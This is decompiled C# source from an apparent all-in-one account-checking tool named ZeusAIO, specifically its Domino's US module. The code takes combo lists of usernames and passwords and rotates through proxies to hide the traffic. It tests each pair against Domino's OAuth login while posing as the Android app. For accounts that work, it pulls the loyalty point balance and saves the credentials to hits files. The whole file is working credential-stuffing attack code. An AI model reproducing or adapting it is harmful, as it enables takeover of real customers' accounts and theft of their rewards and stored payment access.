// Decompiled with JetBrains decompiler
// Type: DominosUS.Check
// Assembly: ZeusAIO, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 70786947-2129-410F-AE9A-C082629DAC36
// Assembly location: C:\Users\ofekt\Desktop\סורס\ZeusAIO.exe

using Leaf.xNet;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Security;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using System.Text.RegularExpressions;
using ZeusAIO;

namespace DominosUS
{
  internal class Check
  {
    public static int threads = 0;
    public static string proxyprotocol = "";
    public static List<string> combos;
    public static List<string> proxies1;
    public static int proxytotal = 0;
    public static int combototal = 0;
    public static int free = 0;
    public static int comboindex = 0;
    public static int cpm = 0;
    public static int cpm_aux = 0;
    public static int check = 0;
    public static int error = 0;
    public static int hit = 0;
    public static int bad = 0;
    public static int h;
    public static int m;
    public static int s;

    public static bool CheckAccount(string[] s, string proxy)
    {
label_29:
      for (int index = 0; index < Config.config.Retries + 1; ++index)
      {
        while (true)
        {
          try
          {
            using (HttpRequest httpRequest = new HttpRequest())
            {
              proxy = mainmenu.proxies.ElementAt<string>(new Random().Next(mainmenu.proxiesCount));
              if (mainmenu.proxyProtocol == "HTTP")
                httpRequest.Proxy = (ProxyClient) HttpProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS4")
                httpRequest.Proxy = (ProxyClient) Socks4ProxyClient.Parse(proxy);
              if (mainmenu.proxyProtocol == "SOCKS5")
                httpRequest.Proxy = (ProxyClient) Socks5ProxyClient.Parse(proxy);
              httpRequest.AllowAutoRedirect = false;
              httpRequest.IgnoreProtocolErrors = true;
              httpRequest.UserAgent = "DominosAndroid/6.4.1 (Android 5.1; unknown/Google Nexus 6; en)";
              string str1 = "grant_type=password&validator_id=VoldemortCredValidator&client_id=nolo-rm&scope=customer%3Acard%3Aread+customer%3Aprofile%3Aread%3Aextended+customer%3AorderHistory%3Aread+customer%3Acard%3Aupdate+customer%3Aprofile%3Aread%3Abasic+customer%3Aloyalty%3Aread+customer%3AorderHistory%3Aupdate+customer%3Acard%3Acreate+customer%3AloyaltyHistory%3Aread+order%3Aplace%3AcardOnFile+customer%3Acard%3Adelete+customer%3AorderHistory%3Acreate+customer%3Aprofile%3Aupdate+easyOrder%3AoptInOut+easyOrder%3Aread&username=" + s[0] + "&password=" + s[1];
              httpRequest.SslCertificateValidatorCallback += (RemoteCertificateValidationCallback) ((obj, cert, ssl, error) => (cert as X509Certificate2).Verify());
              string input = httpRequest.Post("https://authproxy.dominos.com/auth-proxy-service/token.oauth2", str1, "application/x-www-form-urlencoded").ToString();
              if (input.Contains("access_token"))
              {
                string str2 = Regex.Match(input, "access_token\":\"(.*?)\"").Groups[1].Value;
                httpRequest.Authorization = "Bearer " + str2;
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko";
                string str3 = Regex.Match(httpRequest.Post("https://order.dominos.com/power/login", "loyaltyIsActive=true&rememberMe=false&u=" + s[1] + "&p=" + s[1], "application/x-www-form-urlencoded").ToString(), ",\"CustomerID\":\"(.*?)\"").Groups[1].Value;
                string str4 = Regex.Match(httpRequest.Get("https://order.dominos.com/power/customer/" + str3 + "/loyalty?_=1581984138984").ToString(), "VestedPointBalance\":(.*?),").Groups[1].Value;
                ++mainmenu.hits;
                if (mainmenu.p1 == "2")
                  Colorful.Console.WriteLine("[HIT - DOMINOS] " + s[0] + ":" + s[1] + " | Points: " + str4, Color.Green);
                Export.AsResult("/Dominos_hits", s[0] + ":" + s[1] + " | Points: " + str4);
                return false;
              }
              if (!input.Contains("Invalid username & password combination"))
              {
                if (!input.Contains("invalid_grant"))
                {
                  if (input.Contains("eyJ"))
                  {
                    ++mainmenu.hits;
                    while (true)
                    {
                      try
                      {
                        using (StreamWriter streamWriter = new StreamWriter("Results/Dominos US/" + Login.date + "//hits.txt", true))
                        {
                          streamWriter.WriteLine(s[0] + ":" + s[1]);
                          goto label_29;
                        }
                      }
                      catch
                      {
                        Directory.CreateDirectory("Results/Dominos US/" + Login.date);
                      }
                    }
                  }
                  else
                    break;
                }
              }
              else
                break;
            }
          }
          catch (Exception ex)
          {
            ++mainmenu.errors;
          }
        }
      }
      return false;
    }

    public static string Base64Encode(string plainText) => Convert.ToBase64String(Encoding.UTF8.GetBytes(plainText));
  }
}
